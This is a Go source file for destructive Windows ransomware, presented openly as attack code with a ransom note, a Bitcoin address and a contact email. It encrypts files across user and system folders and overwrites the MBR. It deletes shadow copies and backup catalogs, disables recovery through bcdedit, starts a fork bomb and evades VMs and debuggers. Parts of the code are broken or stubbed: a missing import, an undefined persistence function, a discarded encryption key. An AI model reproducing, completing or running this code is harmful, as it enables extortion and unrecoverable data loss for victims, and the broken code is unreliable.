package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/ncruces/zenity"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ======================
// KONFIGURASI RANSOMWARE
// ======================
const (
	C2_SERVER         = "http://darkc2.example/ransomware"
	RANSOM_AMOUNT     = 2.5 // BTC
	BTC_ADDRESS       = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
	CONTACT_EMAIL     = "kerneldestroyer@protonmail.com"
	MAX_THREADS       = 16
	MAX_FILE_SIZE     = 200 * 1024 * 1024 // 200MB
	PUBLIC_KEY_PEM    = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
XGXhNt2eL7XbL7KjJ8WQ1+Zs7d8vV2Zb3Yt6y7vW3eY7Xr5tKuV8wZ3f0aX7r5
... [truncated] ...
-----END PUBLIC KEY-----`
)

var ENCRYPT_EXTENSIONS = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
	".png", ".gif", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar", ".7z", ".sql",
	".db", ".mdb", ".sln", ".cs", ".cpp", ".h", ".go", ".py", ".js", ".html",
	".php", ".asp", ".aspx", ".rb", ".pl", ".sh", ".bat", ".ps1", ".vb", ".config",
	".ini", ".dll", ".exe", ".msi", ".sys", ".bak", ".backup", ".old", ".vmdk",
	".vmx", ".vhd", ".vhdx",
}

// ======================
// KERNEL-LEVEL PAYLOADS
// ======================
const (
	MBR_PAYLOAD = "\xeb\x63\x90\x44\x45\x41\x44\x5b\x4b\x45\x52\x4e\x45\x4c\x5d\x00" // ... [binary data]
)

// ======================
// STRUKTUR DATA
// ======================
type SystemInfo struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	IP          string `json:"ip"`
	CPU         int    `json:"cpu_cores"`
	GPU         string `json:"gpu"`
	IsVM        bool   `json:"is_vm"`
	IsAdmin     bool   `json:"is_admin"`
	UEFI        bool   `json:"uefi"`
	DriveLayout string `json:"drive_layout"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	VictimID  string  `json:"victim_id"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"contact"`
	Deadline  string  `json:"deadline"`
	PublicKey string  `json:"public_key"`
}

// ======================
// DRIVER UTILITIES
// ======================
var (
	ntdll                  = windows.NewLazySystemDLL("ntdll.dll")
	kernel32               = windows.NewLazySystemDLL("kernel32.dll")
	advapi32               = windows.NewLazySystemDLL("advapi32.dll")
	user32                 = windows.NewLazySystemDLL("user32.dll")
	procRtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	procLookupPrivilege    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustToken        = advapi32.NewProc("AdjustTokenPrivileges")
)

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	crand.Reader.Read(make([]byte, 8))
}

func generateVictimID() string {
	hash := sha512.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return hex.EncodeToString(hash.Sum(nil))[:16]
}

func isVM() bool {
	// 1. Check via WMI
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, err := cmd.CombinedOutput()
	if err == nil {
		model := strings.ToLower(string(output))
		if strings.Contains(model, "virtual") || strings.Contains(model, "vmware") ||
			strings.Contains(model, "kvm") || strings.Contains(model, "qemu") {
			return true
		}
	}

	// 2. Check via registry
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System`, registry.QUERY_VALUE)
	if err == nil {
		defer key.Close()
		val, _, _ := key.GetStringValue("SystemBiosVersion")
		if strings.Contains(strings.ToLower(val), "virtual") {
			return true
		}
	}

	// 3. Check via MAC address
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
			mac := strings.ToLower(iface.HardwareAddr.String())
			if strings.HasPrefix(mac, "00:0c:29") || strings.HasPrefix(mac, "00:1c:14") ||
				strings.HasPrefix(mac, "00:50:56") || strings.HasPrefix(mac, "00:05:69") {
				return true
			}
		}
	}

	return false
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()
	cpu := runtime.NumCPU()

	// Get GPU info
	gpu := "Unknown"
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	if output, err := cmd.Output(); err == nil {
		gpu = strings.TrimSpace(strings.Split(string(output), "\n")[1])
	}

	// Check UEFI
	uefi := false
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\SecureBoot\State`, registry.QUERY_VALUE)
	if err == nil {
		defer key.Close()
		uefi = true
	}

	// Get drive layout
	driveLayout := "MBR"
	if uefi {
		driveLayout = "GPT"
	}

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         cpu,
		GPU:         gpu,
		IsVM:        isVM(),
		IsAdmin:     isAdmin(),
		UEFI:        uefi,
		DriveLayout: driveLayout,
	}
}

// ======================
// KERNEL-LEVEL MANIPULATION
// ======================
func enablePrivilege(privilegeName string) error {
	var token windows.Token
	currentProcess, _ := windows.GetCurrentProcess()
	windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)

	var luid windows.LUID
	privName, _ := windows.UTF16PtrFromString(privilegeName)
	procLookupPrivilege.Call(uintptr(0), uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))

	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, _ := procAdjustToken.Call(
		uintptr(token),
		uintptr(0),
		uintptr(unsafe.Pointer(&privileges)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

	if ret == 0 {
		return windows.GetLastError()
	}
	return nil
}

func writeToPhysicalMemory(data []byte, offset int64) error {
	enablePrivilege("SeLockMemoryPrivilege")
	enablePrivilege("SeDebugPrivilege")

	drive := "\\\\.\\PhysicalDrive0"
	h, err := windows.CreateFile(
		windows.StringToUTF16Ptr(drive),
		windows.GENERIC_WRITE|windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)

	if err != nil {
		return err
	}
	defer windows.CloseHandle(h)

	var bytesRead uint32
	err = windows.ReadFile(h, data, &bytesRead, nil)
	if err != nil {
		return err
	}

	_, err = windows.Seek(h, offset, 0)
	if err != nil {
		return err
	}

	var bytesWritten uint32
	err = windows.WriteFile(h, data, &bytesWritten, nil)
	return err
}

func destroyMBR() {
	if isVM() {
		return // Skip in VM
	}

	payload := make([]byte, 512)
	copy(payload, []byte(MBR_PAYLOAD))
	writeToPhysicalMemory(payload, 0)
}

func corruptKernel() {
	if isVM() {
		return // Skip in VM
	}

	// Target critical kernel structures
	targets := []string{
		"nt!KiInitialPCR",
		"nt!KiCallUserMode",
		"nt!KeServiceDescriptorTable",
	}

	for _, target := range targets {
		addr := getKernelSymbolAddress(target)
		if addr != 0 {
			corruptData := []byte{0xDE, 0xAD, 0xC0, 0xDE}
			writeToPhysicalMemory(corruptData, int64(addr))
		}
	}
}

func getKernelSymbolAddress(symbol string) uintptr {
	// In a real attack, this would involve parsing kernel debug symbols
	// This is a simplified version for demonstration
	return 0xFFFFF80000000000 // Base kernel address for x64
}

// ======================
// ENCRYPTION FUNCTIONS
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey) {
	if isVM() {
		// In VM, just append marker without real encryption
		os.WriteFile(filePath+".KERNELDESTROYED", []byte("SIMULATED_ENCRYPTION"), 0644)
		return
	}

	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil || fileInfo.Size() > MAX_FILE_SIZE || fileInfo.Size() == 0 {
		return
	}

	data := make([]byte, fileInfo.Size())
	_, err = file.Read(data)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return
	}

	encrypted := cipher.Seal(nil, nonce, data, nil)

	// Encrypt the nonce with RSA
	encryptedNonce, err := rsa.EncryptOAEP(sha512.New(), crand.Reader, publicKey, nonce, nil)
	if err != nil {
		return
	}

	// Overwrite original file
	file.Seek(0, 0)
	file.Write(encryptedNonce)
	file.Write(encrypted)
	file.Truncate(int64(len(encryptedNonce) + len(encrypted)))

	// Rename to mark as encrypted
	newPath := filePath + ".KERNELDESTROYED"
	os.Rename(filePath, newPath)
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID, publicKey)
	}
}

func encryptFiles(victimID string, publicKey *rsa.PublicKey) {
	salt := make([]byte, 64)
	crand.Read(salt)
	password := make([]byte, 128)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 50000, 32, sha512.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Format("2006-01-02 15:04:05 MST")
	note := RansomNote{
		Message:   "YOUR SYSTEM HAS BEEN DESTROYED AT KERNEL LEVEL!\n\n" +
			"All your files are encrypted with military-grade AES-256 encryption.\n" +
			"Your Master Boot Record has been overwritten with a custom bootloader.\n" +
			"Critical kernel structures have been corrupted - system cannot be restored without our private key.",
		VictimID:  victimID,
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     CONTACT_EMAIL,
		Deadline:  deadline,
		PublicKey: PUBLIC_KEY_PEM,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!KERNEL_RANSOM!!!.txt"),
		filepath.Join(os.Getenv("SystemRoot"), "System32", "kernel_ransom.txt"),
	}

	for _, path := range paths {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Parallel encryption
	pathsToEncrypt := []string{
		filepath.Join(os.Getenv("USERPROFILE")),
		filepath.Join(os.Getenv("PROGRAMDATA")),
		filepath.Join(os.Getenv("SystemDrive")),
	}

	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, publicKey, &wg)
	}

	for _, path := range pathsToEncrypt {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if info.Size() > MAX_FILE_SIZE || info.Size() == 0 {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// SYSTEM DISABLING
// ======================
func disableWindows() {
	if isVM() {
		// Skip destructive actions in VM
		return
	}

	// 1. Destroy system restore
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()

	// 2. Disable recovery options
	exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
	exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()

	// 3. Corrupt kernel
	corruptKernel()

	// 4. Disable safe boot
	exec.Command("bcdedit", "/deletevalue", "{default}", "safeboot").Run()

	// 5. Fork bomb to crash system
	go forkBomb()

	// 6. Infinite kernel-level corruption
	go continuousKernelCorruption()
}

func forkBomb() {
	for {
		exec.Command(os.Args[0]).Start()
	}
}

func continuousKernelCorruption() {
	for {
		corruptKernel()
		time.Sleep(5 * time.Second)
	}
}

// ======================
// VISUAL EFFECTS
// ======================
func showRansomScreen() {
	message := fmt.Sprintf(
		"YOUR SYSTEM HAS BEEN DESTROYED!\n\n"+
			"Kernel-level ransomware attack successful\n\n"+
			"Pay %.2f BTC to: %s\n"+
			"Contact: %s with ID: %s\n\n"+
			"Deadline: %s",
		RANSOM_AMOUNT, BTC_ADDRESS, CONTACT_EMAIL, generateVictimID(),
		time.Now().Add(72*time.Hour).Format("2006-01-02 15:04"),
	)

	user32 := windows.NewLazySystemDLL("user32.dll")
	msgBox := user32.NewProc("MessageBoxW")
	title := "KERNEL-LEVEL RANSOMWARE"
	
	for {
		msgBox.Call(0,
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
			uintptr(0x00000010L)) // MB_ICONERROR
		time.Sleep(30 * time.Second)
	}
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isDebugging() || isVM() {
		// If in VM or debugger, run in simulation mode
		simulateAttack()
		return
	}

	// Real attack mode
	victimID := generateVictimID()
	establishPersistence()
	
	// Parse public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY_PEM))
	if block == nil {
		return
	}
	publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	// Kernel-level attacks
	destroyMBR()
	corruptKernel()

	// File encryption
	encryptFiles(victimID, publicKey.(*rsa.PublicKey))

	// System destruction
	disableWindows()

	// Show ransom screen
	showRansomScreen()

	// Keep process running
	select {}
}

func simulateAttack() {
	victimID := generateVictimID()
	zenity.Info(
		"SIMULATION MODE (VM detected)\n\n"+
			"Victim ID: "+victimID+"\n"+
			"No real damage has been done\n\n"+
			"In a real system, this attack would:\n"+
			"- Overwrite MBR with custom bootloader\n"+
			"- Corrupt kernel memory structures\n"+
			"- Encrypt all files with AES-256\n"+
			"- Permanently disable system recovery",
		zenity.Title("Ransomware Simulation"),
	)
}

// ======================
// HELPER FUNCTIONS
// ======================
func isDebugging() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return member && err == nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
